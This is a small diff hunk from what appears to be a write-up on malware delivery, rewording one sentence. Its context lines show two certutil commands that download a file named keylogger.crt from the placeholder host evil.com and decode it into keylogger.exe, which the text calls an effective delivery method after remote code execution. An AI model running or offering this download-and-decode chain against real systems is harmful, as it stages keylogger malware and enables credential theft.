@@ -127,5 +127,4 @@ certutil -urlcache -split -f http://evil.com/keylogger.crt keylogger.crt
 certutil -decode keylogger.crt keylogger.exe
 ```
 
-Through remote code injection, or your preferred vector. That would be a pretty effective way of delivering
-the malware.   
+Through remote code execution, or vector of your preference this would be a pretty effective way of delivering the malware.   
